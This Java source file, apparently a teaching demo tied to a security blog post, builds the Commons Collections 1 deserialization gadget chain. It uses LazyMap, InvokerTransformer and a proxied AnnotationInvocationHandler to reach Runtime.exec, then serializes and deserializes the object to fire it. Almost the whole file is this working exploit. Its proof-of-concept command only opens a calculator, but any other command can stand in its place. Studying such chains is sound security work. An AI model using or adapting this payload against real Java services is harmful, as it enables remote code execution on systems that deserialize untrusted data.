package Seri.CCGadgets;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

// 博客地址 https://www.moonsec.com/5411.html
public class CC1LazyMapDemo {
    public static void main(String[] args) throws Throwable {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),

                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new String[]{"calc"}),
        };
        Transformer transformerChain = new
                ChainedTransformer(transformers);
//        transformerChain.transform(new Object());
        /**
            等效于
            Class<?> clazz = Runtime.class;
            Method method = clazz.getMethod("getRuntime", new Class[0]);
            Runtime runtime = (Runtime) method.invoke(null, new Object[0]);
            runtime.exec("calc");
         */

        Map in = new HashMap();
        Map out = LazyMap.decorate(in, transformerChain);
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> ctor = clazz.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);

        InvocationHandler handler = (InvocationHandler) ctor.newInstance(Retention.class, out);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader() , new Class[]{Map.class}, handler);

        handler = (InvocationHandler) ctor.newInstance(Retention.class, proxyMap);



        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}
